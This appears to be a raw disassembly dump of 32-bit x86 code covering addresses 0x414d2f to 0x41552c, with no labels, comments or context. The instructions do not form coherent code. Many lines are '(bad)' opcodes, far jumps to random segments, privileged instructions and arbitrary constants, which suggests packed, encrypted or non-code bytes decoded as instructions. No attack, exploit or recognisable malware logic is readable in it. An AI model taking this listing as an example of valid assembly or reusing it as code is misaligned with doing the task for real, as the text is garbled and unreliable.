  414d2f:	sbb    ebp,esp
  414d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d32:	js     0x414dac
  414d34:	pop    ebp
  414d35:	dec    ebx
  414d36:	inc    edx
  414d37:	mov    BYTE PTR [esi],ch
  414d39:	mov    dl,0x1d
  414d3b:	fwait
  414d3c:	imul   edi,edx,0x5b
  414d3f:	leave  
  414d40:	popf   
  414d41:	pop    esp
  414d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d43:	(bad)  
  414d44:	stc    
  414d45:	fidivr DWORD PTR [edi+0x7ba70979]
  414d4b:	aam    0x98
  414d4d:	xchg   esi,eax
  414d4e:	pop    es
  414d4f:	pop    ss
  414d50:	sub    DWORD PTR [edx],edi
  414d52:	(bad)  
  414d54:	(bad)  
  414d55:	ror    BYTE PTR [esi+0x5],0xca
  414d59:	and    dh,BYTE PTR [edi]
  414d5b:	jbe    0x414d85
  414d5d:	and    BYTE PTR [esi-0x7],al
  414d60:	mov    bl,0x8e
  414d62:	or     eax,0x5eb3e4ee
  414d67:	or     dh,bh
  414d69:	jbe    0x414dcd
  414d6b:	jmp    0xa3bc3ce1
  414d70:	sti    
  414d71:	addr16 adc eax,0x825c60fa
  414d77:	dec    esi
  414d78:	mov    edx,0xd4b46d80
  414d7d:	popf   
  414d7e:	jbe    0x414d1f
  414d80:	pop    ecx
  414d81:	jp     0x414dc6
  414d83:	sub    DWORD PTR [edi],esi
  414d85:	fstp   TBYTE PTR [esi+0x337123d5]
  414d8b:	es (bad) 
  414d8d:	xchg   esi,eax
  414d8e:	popa   
  414d8f:	ss and edx,esp
  414d92:	mov    esi,0xa91c1ad
  414d97:	nop
  414d98:	push   cs
  414d99:	add    BYTE PTR ds:0x3440b2ce,bh
  414d9f:	movd   DWORD PTR [edx+0x6cf84a6c],mm0
  414da6:	jbe    0x414db7
  414da8:	test   al,0x21
  414daa:	dec    eax
  414dab:	cli    
  414dac:	mov    ah,0xe6
  414dae:	js     0x414da5
  414db0:	xchg   esi,eax
  414db1:	mov    eax,ds:0x8cf77e2e
  414db6:	push   0x87f6b0f5
  414dbb:	adc    BYTE PTR [edi-0x5],bh
  414dbe:	jmp    0x499f:0xaf4f2dd3
  414dc5:	mov    ds:0xb396e73,al
  414dca:	cwde   
  414dcb:	inc    ecx
  414dcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dcd:	mov    edi,0x5b97af17
  414dd2:	les    edi,FWORD PTR [ecx-0x47]
  414dd5:	retf   0x678f
  414dd8:	jle    0x414d94
  414dda:	xchg   DWORD PTR [ebx+eiz*1],eax
  414ddd:	fwait
  414dde:	rcr    edi,cl
  414de0:	adc    ecx,eax
  414de2:	stc    
  414de3:	test   BYTE PTR [edi-0x54],bl
  414de6:	sub    al,0x82
  414de8:	pop    ss
  414de9:	loop   0x414e00
  414deb:	mov    ch,BYTE PTR [esp+edx*8-0x52]
  414def:	sub    BYTE PTR [ebx+0x3c593d0e],dh
  414df5:	pop    esi
  414df6:	adc    BYTE PTR [ebx],0x25
  414df9:	push   DWORD PTR [esi]
  414dfb:	add    BYTE PTR [edi],bh
  414dfd:	adc    eax,0x46b1f434
  414e02:	xor    BYTE PTR [esi-0x75],bl
  414e05:	mov    DWORD PTR [edi-0x34],esp
  414e08:	ins    DWORD PTR es:[edi],dx
  414e09:	pusha  
  414e0a:	cs add edi,esp
  414e0d:	and    DWORD PTR [esi-0x5d6dad23],0x34fa4f27
  414e17:	sub    al,0x4f
  414e19:	cmp    al,dh
  414e1b:	rol    bh,1
  414e1d:	inc    edx
  414e1e:	mov    dh,0xc8
  414e20:	push   esp
  414e21:	rcr    DWORD PTR [esi+0x1933d805],1
  414e27:	fisubr DWORD PTR [esi]
  414e29:	mov    ebx,0xb6c1beed
  414e2e:	(bad)  
  414e2f:	dec    ecx
  414e30:	mov    ch,0x34
  414e32:	aaa    
  414e33:	mov    esp,0x1232f0e1
  414e38:	enter  0x5bd9,0xac
  414e3c:	mov    edx,0x354fa5e
  414e41:	xchg   ebx,ecx
  414e43:	pop    esi
  414e44:	add    BYTE PTR [ebx*2-0x30316ae6],dl
  414e4b:	inc    ebp
  414e4c:	jecxz  0x414df8
  414e4e:	ins    DWORD PTR es:[edi],dx
  414e4f:	pop    ebx
  414e50:	neg    DWORD PTR [edi]
  414e52:	cmp    eax,0xb9587863
  414e57:	enter  0xe98c,0x5b
  414e5b:	jmp    0x414e3e
  414e5d:	mov    esi,0xb6fc0c14
  414e62:	push   esp
  414e63:	test   al,0x35
  414e65:	mov    dh,ah
  414e67:	push   ebp
  414e68:	out    0xfd,al
  414e6a:	dec    ebx
  414e6b:	repz xchg esi,eax
  414e6d:	mov    dh,0x88
  414e6f:	push   esp
  414e70:	dec    ebx
  414e71:	das    
  414e72:	xor    DWORD PTR [ebx+eax*4+0x5c],0xfffffff5
  414e77:	pop    esi
  414e78:	fisubr DWORD PTR [edi+eiz*2]
  414e7b:	inc    edi
  414e7c:	les    esp,FWORD PTR [eax+0x77]
  414e7f:	fst    QWORD PTR [esi]
  414e81:	and    ebp,eax
  414e83:	aaa    
  414e84:	dec    ebp
  414e85:	stos   DWORD PTR es:[edi],eax
  414e86:	xor    ah,al
  414e88:	bound  edx,QWORD PTR [edi-0x2688f04c]
  414e8e:	mul    BYTE PTR [esi]
  414e90:	mov    esp,0x94e7cba
  414e95:	mov    ds:0x55c9a844,al
  414e9a:	sub    eax,0xd22843eb
  414e9f:	mov    al,0x37
  414ea1:	icebp  
  414ea2:	push   ecx
  414ea3:	loopne 0x414e79
  414ea5:	retf   
  414ea6:	sub    eax,0xb6ae3100
  414eab:	pop    ecx
  414eac:	inc    ecx
  414ead:	lahf   
  414eae:	push   edx
  414eaf:	scas   al,BYTE PTR es:[edi]
  414eb0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  414eb2:	mov    al,ds:0x20fd96c9
  414eb7:	mov    ch,dh
  414eb9:	fs popa 
  414ebb:	out    dx,eax
  414ebc:	xchg   esi,edx
  414ebe:	or     bl,BYTE PTR [eax+ebp*2-0x49]
  414ec2:	aam    0xf2
  414ec4:	sbb    dl,dl
  414ec6:	nop
  414ec7:	popf   
  414ec8:	repnz mov al,ds:0xf48df24d
  414ece:	lods   al,BYTE PTR ds:[esi]
  414ecf:	jmp    0xd0e9bdb0
  414ed4:	int    0x9a
  414ed6:	mov    ebp,0xe92300ef
  414edb:	stos   BYTE PTR es:[edi],al
  414edc:	and    DWORD PTR [esi+0x6712a064],esi
  414ee2:	and    eax,0x4b4e1fa2
  414ee7:	pop    eax
  414ee8:	jns    0x414f37
  414eea:	pop    edx
  414eeb:	data16 sar BYTE PTR [edi-0x49],cl
  414eef:	int3   
  414ef0:	not    DWORD PTR ds:0xf7984bdd
  414ef6:	push   ds
  414ef7:	addr16 sti 
  414ef9:	fistp  WORD PTR [ecx+0x8]
  414efc:	into   
  414efd:	sbb    ebx,eax
  414eff:	fcom   QWORD PTR [edi-0x7c]
  414f02:	repnz (bad) 
  414f04:	sub    al,0x32
  414f06:	aad    0x51
  414f08:	sbb    ebp,esi
  414f0a:	in     eax,dx
  414f0b:	dec    edx
  414f0c:	ret    0xe33f
  414f0f:	cmp    BYTE PTR [ebx],al
  414f11:	ja     0x414f13
  414f13:	in     al,dx
  414f14:	ret    0x542
  414f17:	pop    eax
  414f18:	cdq    
  414f19:	mov    al,0xd2
  414f1b:	sub    al,BYTE PTR [edi+esi*4-0xd2c8edb]
  414f22:	push   0x7a6d31b6
  414f27:	dec    esi
  414f28:	or     eax,0x640b96b6
  414f2d:	xchg   esp,eax
  414f2e:	mov    al,0x7a
  414f30:	cmp    dh,al
  414f32:	addr16 jp 0x414f45
  414f35:	popa   
  414f36:	ret    0xda7e
  414f39:	xor    ah,bh
  414f3b:	imul   eax,DWORD PTR [esi-0x41],0xffffffb5
  414f3f:	into   
  414f40:	xchg   edx,eax
  414f41:	mov    bl,0x26
  414f43:	and    dh,BYTE PTR [ebp-0x26]
  414f46:	popf   
  414f47:	sub    al,0xc0
  414f49:	inc    esp
  414f4a:	fsub   QWORD PTR [edx]
  414f4c:	lods   al,BYTE PTR ds:[esi]
  414f4d:	mov    ch,0x2d
  414f4f:	xchg   edx,eax
  414f50:	stos   DWORD PTR es:[edi],eax
  414f51:	add    DWORD PTR [edx],0xfffffff4
  414f54:	out    dx,eax
  414f55:	dec    edi
  414f56:	inc    BYTE PTR [ecx]
  414f58:	outs   dx,BYTE PTR ds:[esi]
  414f59:	hlt    
  414f5a:	mov    al,ds:0x47df900b
  414f5f:	in     al,dx
  414f60:	hlt    
  414f61:	test   al,0x3
  414f63:	push   ecx
  414f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f65:	loop   0x414f1d
  414f67:	ficomp DWORD PTR [ebp+0x28]
  414f6a:	inc    ch
  414f6c:	ds retf 
  414f6e:	(bad)  
  414f6f:	call   0xd6ddee33
  414f74:	das    
  414f75:	or     DWORD PTR [ecx+0xb],ebp
  414f78:	dec    edi
  414f79:	call   0x38cafaf6
  414f7e:	cs fdivrp st(6),st
  414f81:	punpckhwd mm2,QWORD PTR [eax-0x2d]
  414f85:	lods   al,BYTE PTR ds:[esi]
  414f86:	jbe    0x414f42
  414f88:	les    ebx,FWORD PTR [edx+0x8f290cd]
  414f8e:	out    dx,al
  414f8f:	add    DWORD PTR [ebp-0x6fd683eb],ecx
  414f95:	xor    eax,0x44f69ad
  414f9a:	fstp   QWORD PTR [ebp+0x7d]
  414f9d:	stc    
  414f9e:	jg     0x414f3d
  414fa0:	mov    bh,0x4a
  414fa2:	jb     0x414f2f
  414fa4:	inc    ebp
  414fa5:	cmp    eax,0xa2881b5e
  414faa:	and    BYTE PTR [eax-0x3d],bl
  414fad:	cmp    al,0xb8
  414faf:	cwde   
  414fb0:	add    edi,esp
  414fb2:	ja     0x414f37
  414fb4:	mov    DWORD PTR [edx-0x8],ecx
  414fb7:	imul   DWORD PTR [edi+0x197aeb79]
  414fbd:	sbb    BYTE PTR [edi+0x2100361],bl
  414fc3:	mov    esp,0x8bf73b5d
  414fc8:	push   edi
  414fc9:	xor    eax,0x98e23bf5
  414fce:	push   eax
  414fcf:	jmp    0x9a73:0xeadcace1
  414fd6:	ret    
  414fd7:	lds    esp,FWORD PTR [ecx-0x68]
  414fda:	enter  0x6433,0xd3
  414fde:	add    BYTE PTR [ecx],dh
  414fe0:	add    ebx,DWORD PTR [edi]
  414fe2:	jne    0x414fbe
  414fe4:	gs and ebx,esi
  414fe7:	stos   DWORD PTR es:[edi],eax
  414fe8:	jne    0x415023
  414fea:	fisub  DWORD PTR [ebp+0x1d]
  414fed:	mov    DWORD PTR [ebx-0x5a],ecx
  414ff0:	pop    esi
  414ff1:	rcl    edi,0xce
  414ff4:	clts   
  414ff6:	mov    dl,0x7a
  414ff8:	stos   DWORD PTR es:[edi],eax
  414ff9:	out    0x35,eax
  414ffb:	inc    edi
  414ffc:	push   cs
  414ffd:	pop    eax
  414ffe:	in     al,0xf7
  415000:	jnp    0x414f83
  415002:	mov    ds:0x49fa768b,eax
  415007:	retf   0xbf62
  41500a:	jnp    0x415078
  41500c:	push   esp
  41500d:	icebp  
  41500e:	fcom   QWORD PTR [edi-0x7383077c]
  415014:	lock lods al,BYTE PTR ds:[esi]
  415016:	loope  0x415070
  415018:	mov    ebx,DWORD PTR [ebp-0x16]
  41501b:	mov    esi,0x30710bac
  415020:	dec    esp
  415021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415022:	ret    0xd4fc
  415025:	mov    dl,0x6a
  415027:	gs mov ch,0x5a
  41502a:	xor    ebp,esp
  41502c:	adc    ebp,DWORD PTR [ebx+0x2b]
  41502f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415030:	add    edi,DWORD PTR [eax+0x26]
  415033:	cs nop
  415035:	dec    edx
  415036:	retf   
  415037:	leave  
  415038:	or     eax,esp
  41503a:	out    0xf6,al
  41503c:	aad    0xbf
  41503e:	mov    edi,0x3e939696
  415043:	jmp    0xdb4f:0x414f250a
  41504a:	fadd   QWORD PTR [edx+0x2a4eb372]
  415050:	les    esp,FWORD PTR [ebx+eax*1+0x2d]
  415054:	repz xchg edx,eax
  415056:	cdq    
  415057:	call   0x378fce09
  41505c:	mov    bl,bh
  41505e:	inc    edi
  41505f:	inc    esp
  415060:	stos   BYTE PTR es:[edi],al
  415061:	rcl    BYTE PTR [ebx-0x7cdd327f],cl
  415067:	pop    ebp
  415068:	pop    es
  415069:	ret    
  41506a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41506b:	inc    eax
  41506c:	dec    ebp
  41506d:	mov    edx,0x4b2d68e8
  415072:	lahf   
  415073:	dec    ecx
  415074:	addr16 je 0x41507c
  415077:	test   ah,cl
  415079:	xchg   ebp,eax
  41507a:	pop    ebp
  41507b:	cmp    dl,bl
  41507d:	cmp    edi,DWORD PTR [ebx]
  41507f:	test   al,0x42
  415081:	addr16 inc esp
  415083:	das    
  415084:	ins    BYTE PTR es:[edi],dx
  415085:	mov    bl,0xf6
  415087:	mov    al,0xa9
  415089:	mov    al,ds:0xe0a63b65
  41508e:	neg    DWORD PTR [ecx+edi*2]
  415091:	popf   
  415092:	(bad)  
  415093:	xor    ch,BYTE PTR [ebx+0x4612d4d]
  415099:	les    esp,FWORD PTR [esi]
  41509b:	aam    0xe1
  41509d:	push   ecx
  41509e:	pop    eax
  41509f:	mov    bh,0xcc
  4150a1:	add    al,0x94
  4150a3:	pushf  
  4150a4:	repz rcl DWORD PTR [ebx-0x5f],1
  4150a8:	pop    DWORD PTR ds:0x26e5c9b0
  4150ae:	pop    edi
  4150af:	sbb    al,0x3c
  4150b1:	mov    al,0xfb
  4150b3:	xchg   ebp,eax
  4150b4:	adc    al,0x7b
  4150b6:	fsubp  st(0),st
  4150b8:	xchg   esi,eax
  4150b9:	jecxz  0x4150b5
  4150bb:	out    0x8a,eax
  4150bd:	pushf  
  4150be:	sub    al,0x86
  4150c0:	sbb    eax,0xd9ad875e
  4150c5:	mov    ch,0xa8
  4150c7:	cmp    bl,BYTE PTR [edi]
  4150c9:	push   esi
  4150ca:	mov    esp,0xc81dd61c
  4150cf:	in     eax,0xa4
  4150d1:	and    DWORD PTR [edi+0x9364628],esp
  4150d7:	fnstcw WORD PTR [edi-0x6aaf585f]
  4150dd:	dec    eax
  4150de:	sbb    BYTE PTR [eax+0x30],dh
  4150e1:	int    0xa0
  4150e3:	inc    esi
  4150e4:	shl    BYTE PTR [edi+0x5f],0x71
  4150e8:	outs   dx,BYTE PTR ds:[esi]
  4150e9:	or     BYTE PTR [ebp-0x6374f113],dl
  4150ef:	add    bl,dh
  4150f1:	jnp    0x415082
  4150f3:	or     eax,0xbfab65ea
  4150f8:	sti    
  4150f9:	sub    DWORD PTR [esi-0x6b],edi
  4150fc:	loope  0x415148
  4150fe:	scas   eax,DWORD PTR es:[edi]
  4150ff:	ds adc eax,0x4120a304
  415105:	ficom  DWORD PTR [edi]
  415107:	sbb    esi,esp
  415109:	jnp    0x4150f0
  41510b:	daa    
  41510c:	or     eax,0x2d4edc2
  415111:	mov    esi,0x5c435068
  415116:	xor    BYTE PTR [ecx+0x51],dh
  415119:	dec    esi
  41511a:	test   al,0x87
  41511c:	fisub  DWORD PTR [edi-0x79]
  41511f:	push   ebp
  415120:	out    0x0,al
  415122:	jne    0x41516f
  415124:	pop    ds
  415125:	dec    esp
  415126:	inc    esi
  415127:	ss stos BYTE PTR es:[edi],al
  415129:	add    al,0x29
  41512b:	pop    es
  41512c:	daa    
  41512d:	jns    0x4150c8
  41512f:	dec    eax
  415130:	jns    0x4150f5
  415132:	jmp    0x1154:0x36e64a73
  415139:	daa    
  41513a:	ja     0x415167
  41513c:	and    DWORD PTR [eax],ebp
  41513e:	mov    bh,0x36
  415140:	hlt    
  415141:	xchg   ebp,eax
  415142:	jp     0x41518f
  415144:	data16 jg 0x4151b1
  415147:	push   0xffffffd2
  415149:	mov    ecx,0x71c3c9e4
  41514e:	mov    esp,0xbea44954
  415153:	xchg   DWORD PTR ds:[ebp+0x56732c5],ecx
  41515a:	xor    DWORD PTR ds:0x87d8977d,esp
  415160:	iret   
  415161:	jmp    0x2194:0x283dae2b
  415168:	jmp    0x5994:0x6cf7224a
  41516f:	jae    0x4151b2
  415171:	mov    ecx,0x22ddf27c
  415176:	daa    
  415177:	stos   BYTE PTR es:[edi],al
  415178:	or     dl,BYTE PTR [edi]
  41517a:	aad    0xcf
  41517c:	lock popa 
  41517e:	sar    DWORD PTR [esp+eax*4],0x5a
  415182:	or     bh,BYTE PTR [ebx-0x7031071]
  415188:	retf   
  415189:	dec    edi
  41518a:	mov    ebp,0xb2f8cc66
  41518f:	cmp    eax,0xabf90b13
  415194:	jecxz  0x4151b8
  415196:	mov    sp,bx
  415199:	mov    esp,0x22a96eba
  41519e:	clc    
  41519f:	ss aaa 
  4151a1:	jno    0x4151da
  4151a3:	add    edx,DWORD PTR [ebx+0x39a76408]
  4151a9:	sub    bh,BYTE PTR [ecx+0x67b82ec0]
  4151af:	mov    al,0x4c
  4151b1:	and    BYTE PTR [esi+0x4613a67a],dh
  4151b7:	adc    DWORD PTR [edi-0x4ddfe4f4],eax
  4151bd:	enter  0x72dc,0xb5
  4151c1:	sbb    eax,0x6bdb703a
  4151c6:	mov    ebp,0x7953d44b
  4151cb:	ss pop edx
  4151cd:	mov    gs,WORD PTR [eax+0x9]
  4151d0:	mov    edi,edi
  4151d2:	je     0x415238
  4151d4:	in     eax,0x9a
  4151d6:	sti    
  4151d7:	sbb    BYTE PTR [ebp+0x27ad88d7],al
  4151dd:	push   0xae3044d4
  4151e2:	xchg   ebx,eax
  4151e3:	jb     0x415188
  4151e5:	ret    
  4151e6:	dec    esi
  4151e7:	test   al,0xb
  4151e9:	inc    BYTE PTR ds:0xb04cafeb
  4151ef:	(bad)  
  4151f0:	mov    al,ds:0x9207e021
  4151f5:	mov    al,ch
  4151f7:	and    eax,0x4e7388f9
  4151fc:	cmc    
  4151fd:	sar    DWORD PTR [esp+edx*8+0x6c0bd8b9],1
  415204:	mov    esp,0xb55c09ec
  415209:	or     al,0x78
  41520b:	push   ebx
  41520c:	in     al,0xbe
  41520e:	or     ebx,DWORD PTR [edi]
  415210:	mov    ecx,0xa41bcbf5
  415215:	outs   dx,BYTE PTR ds:[esi]
  415216:	jecxz  0x41525f
  415218:	dec    esp
  415219:	xor    BYTE PTR [edi-0x4ba9fbb2],0x1e
  415220:	sub    ah,dl
  415222:	dec    ebx
  415223:	es jnp 0x4151ed
  415226:	sbb    al,0x34
  415228:	pop    edx
  415229:	lahf   
  41522a:	sbb    bl,dl
  41522c:	sub    al,0x54
  41522e:	outs   dx,DWORD PTR ds:[esi]
  41522f:	jmp    0x2c3b:0x66c8afec
  415236:	sar    DWORD PTR [ecx+0x238db259],cl
  41523c:	push   esp
  41523d:	in     al,0xaf
  41523f:	adc    al,0x57
  415241:	mul    BYTE PTR [ebp-0x4b]
  415244:	bound  ecx,QWORD PTR [eax+0x29730dd8]
  41524a:	sbb    DWORD PTR [ebp-0x426fbedc],0xb
  415251:	(bad)  
  415252:	mov    ds:0x45029d2d,al
  415258:	icebp  
  415259:	call   0x3d227775
  41525e:	sbb    ebx,DWORD PTR [ebx+0x14]
  415261:	sbb    al,0x10
  415263:	cmp    esp,esi
  415265:	imul   ebp,DWORD PTR [edx],0x87d17d9b
  41526b:	push   es
  41526c:	or     esi,DWORD PTR [edx-0x27dbb523]
  415272:	lods   al,BYTE PTR ds:[esi]
  415273:	adc    bl,0x34
  415276:	dec    edi
  415277:	lahf   
  415278:	inc    ebx
  415279:	sbb    eax,0x66aa7f9b
  41527e:	outs   dx,BYTE PTR ds:[esi]
  41527f:	fst    DWORD PTR [edx]
  415281:	cli    
  415282:	push   0xe9dd53d
  415287:	into   
  415288:	leave  
  415289:	stc    
  41528a:	repnz (bad) 
  41528c:	adc    DWORD PTR [ecx+0x50],edi
  41528f:	(bad)  [ebx+0x127e6fff]
  415295:	fs loopne 0x415240
  415298:	retf   0xf593
  41529b:	outs   dx,DWORD PTR ds:[esi]
  41529c:	(bad)  
  41529d:	std    
  41529e:	push   edx
  41529f:	ja     0x415237
  4152a1:	push   cs
  4152a2:	inc    eax
  4152a3:	aad    0xe1
  4152a5:	and    DWORD PTR [esi],esi
  4152a7:	cmp    esp,DWORD PTR [esp+ecx*8]
  4152aa:	mov    ch,0x85
  4152ac:	mov    ch,0x2a
  4152ae:	cmc    
  4152af:	fdiv   st,st(3)
  4152b1:	cld    
  4152b2:	js     0x415248
  4152b4:	cmp    cl,bh
  4152b6:	in     al,dx
  4152b7:	pop    edx
  4152b8:	adc    ch,cl
  4152ba:	dec    eax
  4152bb:	test   eax,0xc90530bd
  4152c0:	or     ebp,edi
  4152c2:	sbb    BYTE PTR [eax+0x1f],0xb5
  4152c6:	jmp    0x24d1:0x9b010cea
  4152cd:	scas   al,BYTE PTR es:[edi]
  4152ce:	jmp    0xc232:0x1a8a3b3a
  4152d5:	xor    DWORD PTR [edx-0x20],edi
  4152d8:	jmp    0xd4e422b8
  4152dd:	dec    eax
  4152de:	retfw  0x670e
  4152e2:	mov    bl,0xd2
  4152e4:	leave  
  4152e5:	mov    DWORD PTR [esi+0x1b],eax
  4152e8:	es sub eax,edx
  4152eb:	xchg   edi,eax
  4152ec:	pop    edx
  4152ed:	xchg   ebp,eax
  4152ee:	xor    al,0xde
  4152f0:	rcr    DWORD PTR [edi],0xb
  4152f3:	add    BYTE PTR [ecx],ch
  4152f5:	add    DWORD PTR [edx-0x64],0xffffffdd
  4152f9:	or     al,0x30
  4152fb:	mov    eax,ds:0xcc05f608
  415300:	lock into 
  415302:	xor    eax,0xc9f9dd50
  415307:	in     al,dx
  415308:	add    eax,0x964e2dd6
  41530d:	mov    esp,0xffb289cb
  415312:	adc    eax,0xd1e0c4d8
  415317:	test   BYTE PTR [ebx-0x55513bd0],ah
  41531d:	rol    bl,0x87
  415320:	in     eax,dx
  415321:	xor    esi,ecx
  415323:	or     DWORD PTR [eax],ecx
  415325:	out    0x5f,al
  415327:	push   cs
  415328:	sti    
  415329:	test   BYTE PTR [eax-0x39fa1956],0xa5
  415330:	out    dx,al
  415331:	sbb    al,0x57
  415333:	adc    bl,bl
  415335:	sbb    al,0x2d
  415337:	cmc    
  415338:	adc    ebx,DWORD PTR [ebp+0x644ebfd]
  41533e:	sbb    DWORD PTR [ebp+0x47cac5d6],ecx
  415344:	mov    bh,0xbe
  415346:	stos   BYTE PTR es:[edi],al
  415347:	push   ds
  415348:	jae    0x41531a
  41534a:	cld    
  41534b:	jmp    0xa36d9bb2
  415350:	test   al,0xda
  415352:	call   0x2d5a34b4
  415357:	leave  
  415358:	jmp    0x4153a8
  41535a:	mov    eax,0x8219937
  41535f:	lock in al,0xc2
  415362:	ret    0xd7d0
  415365:	inc    ebx
  415366:	dec    ecx
  415367:	daa    
  415368:	inc    eax
  415369:	shl    DWORD PTR ds:0x7deaede0,1
  41536f:	mov    edx,0x76713fca
  415374:	shl    BYTE PTR [ebp+ebx*2+0x6e8e3033],0xfe
  41537c:	ins    BYTE PTR es:[edi],dx
  41537d:	test   DWORD PTR [esi+0x64d97ed5],edx
  415383:	mov    ecx,0x38faa4cc
  415388:	mov    esi,0xce996067
  41538d:	shr    BYTE PTR [ebx-0xde0020a],0xb0
  415394:	dec    edi
  415395:	push   eax
  415396:	mov    ch,0xf9
  415398:	call   0x346da09d
  41539d:	mov    bl,0xa3
  41539f:	push   ds
  4153a0:	sub    DWORD PTR [edi-0x7],esi
  4153a3:	jge    0x415415
  4153a5:	daa    
  4153a6:	shr    ah,0xd8
  4153a9:	and    edx,ebp
  4153ab:	inc    edi
  4153ac:	jmp    0x415365
  4153ae:	jmp    0x4153c3
  4153b0:	mov    esi,DWORD PTR [edx+ebp*4]
  4153b3:	pop    ds
  4153b4:	les    esi,FWORD PTR [eax]
  4153b6:	imul   ebp,DWORD PTR [edi],0xffffffb1
  4153b9:	and    eax,0x77a56d90
  4153be:	scas   eax,DWORD PTR es:[edi]
  4153bf:	sbb    ebx,ecx
  4153c1:	dec    ecx
  4153c2:	adc    eax,0x70b445d9
  4153c7:	test   DWORD PTR [edi],esp
  4153c9:	fist   DWORD PTR [edx-0x4f0e819]
  4153cf:	adc    BYTE PTR [ecx-0x2356ce06],bh
  4153d5:	sbb    al,0x40
  4153d7:	out    dx,eax
  4153d8:	add    al,0x88
  4153da:	or     ch,dl
  4153dc:	gs dec ecx
  4153de:	jbe    0x4153c8
  4153e0:	jb     0x415440
  4153e2:	xchg   ebp,eax
  4153e3:	jb     0x415431
  4153e5:	mov    WORD PTR ds:0x5d796c6a,cs
  4153eb:	dec    edi
  4153ec:	and    DWORD PTR [edx-0x6],eax
  4153ef:	cli    
  4153f0:	fs fwait
  4153f2:	mov    al,0x3d
  4153f4:	mov    eax,ebx
  4153f6:	mov    bl,bh
  4153f8:	bound  esp,QWORD PTR ds:0x73246339
  4153fe:	sub    dl,BYTE PTR [ecx]
  415400:	inc    esp
  415401:	mov    esi,0x36c982c0
  415406:	mov    dh,0x93
  415408:	iret   
  415409:	not    BYTE PTR [eax+0x47f8cc36]
  41540f:	imul   ebx,DWORD PTR [ebx+0xece4974],0x23
  415416:	nop
  415417:	ins    DWORD PTR es:[edi],dx
  415418:	cs push 0x72
  41541b:	popa   
  41541c:	inc    ecx
  41541d:	test   al,0xb2
  41541f:	ja     0x415432
  415421:	pop    ecx
  415422:	(bad)  
  415423:	mov    esp,0x737e9a2f
  415428:	aas    
  415429:	scas   al,BYTE PTR es:[edi]
  41542a:	sub    eax,0x9134f3ae
  41542f:	cmp    eax,ecx
  415431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415432:	sub    ah,bl
  415434:	dec    ebx
  415435:	inc    ecx
  415436:	fdivr  st(6),st
  415438:	retf   0x82a
  41543b:	les    esi,FWORD PTR [ebx]
  41543d:	(bad)  
  41543e:	scas   al,BYTE PTR es:[edi]
  41543f:	(bad)  
  415440:	or     al,0x83
  415442:	xchg   esp,eax
  415443:	sub    eax,0xc091313f
  415448:	jo     0x41548e
  41544a:	ror    DWORD PTR [eax-0x69],0x68
  41544e:	sbb    eax,0x437b9bcb
  415453:	jne    0x415419
  415455:	lea    edi,[ebx+ebp*1]
  415458:	fnstenv [edx-0x6643e0b7]
  41545e:	iret   
  41545f:	push   ds
  415460:	loopne 0x415425
  415462:	add    edi,edx
  415464:	adc    ah,BYTE PTR [eax+0x3c55bf15]
  41546a:	loopne 0x415442
  41546c:	xchg   ebx,eax
  41546d:	pop    es
  41546e:	inc    edi
  41546f:	repz pop ss
  415471:	inc    ebx
  415472:	jno    0x4154d6
  415474:	lods   al,BYTE PTR ds:[esi]
  415475:	into   
  415476:	dec    eax
  415477:	or     BYTE PTR [edx],0xf4
  41547a:	xchg   ecx,eax
  41547b:	mov    ds:0x3e5a5f60,al
  415480:	loop   0x415415
  415482:	sbb    ch,al
  415484:	pop    eax
  415485:	or     bh,BYTE PTR [ebx]
  415487:	lods   eax,DWORD PTR ds:[esi]
  415488:	pop    esp
  415489:	push   ebx
  41548a:	fs inc eax
  41548c:	jecxz  0x4154df
  41548e:	ret    
  41548f:	mov    ebx,0xc4d6d25d
  415494:	das    
  415495:	jg     0x41542b
  415497:	imul   edx,DWORD PTR [ebx-0x70],0xf45b366c
  41549e:	outs   dx,DWORD PTR ds:[esi]
  41549f:	pop    esp
  4154a0:	xchg   edi,eax
  4154a1:	or     DWORD PTR [ebp-0x80],edx
  4154a4:	mov    ?,WORD PTR [edx-0x48e0a75a]
  4154aa:	mov    ch,0x28
  4154ac:	sti    
  4154ad:	loop   0x415525
  4154af:	jge    0x415505
  4154b1:	xor    DWORD PTR [eax],ecx
  4154b3:	xchg   edx,eax
  4154b4:	dec    ecx
  4154b5:	and    cl,BYTE PTR [ecx-0x6d]
  4154b8:	scas   eax,DWORD PTR es:[edi]
  4154b9:	jle    0x415529
  4154bb:	sub    cl,BYTE PTR [ebx]
  4154bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154be:	or     BYTE PTR [esi],0x90
  4154c1:	in     al,0x69
  4154c3:	aas    
  4154c4:	imul   esp,ebp,0xffffff87
  4154c7:	and    ah,BYTE PTR [edi-0x196d4fd5]
  4154cd:	jmp    0x568c:0x429b347f
  4154d4:	jmp    0x4154e9
  4154d6:	sar    DWORD PTR [eax-0x1928a1cf],1
  4154dc:	popw   es
  4154de:	hlt    
  4154df:	or     DWORD PTR [eax+ebp*2],edx
  4154e2:	psrld  mm3,QWORD PTR [ebx-0x30cea0ec]
  4154e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ea:	in     al,0xde
  4154ec:	neg    bh
  4154ee:	sbb    eax,0x9e73c17d
  4154f3:	mov    cl,0x4e
  4154f5:	mov    bl,0xea
  4154f7:	fldcw  WORD PTR [ebx-0x58]
  4154fa:	les    ebp,FWORD PTR [ebp+0x74958ef2]
  415500:	rol    DWORD PTR [ebx+eiz*1-0x80],0x9c
  415505:	mov    dh,0x4e
  415507:	mov    esi,DWORD PTR [esi-0x1e]
  41550a:	xchg   ebx,eax
  41550b:	arpl   WORD PTR [ebx-0x337a4043],dx
  415511:	mov    edi,0x4544cdc7
  415516:	in     eax,0xaf
  415518:	xchg   esp,eax
  415519:	test   eax,0x953b20dd
  41551e:	pop    es
  41551f:	xchg   ebx,eax
  415520:	cmc    
  415521:	lahf   
  415522:	or     al,0xd3
  415524:	push   0x687c9bab
  415529:	cdq    
  41552a:	aad    0x41
  41552c:	lock inc ebp
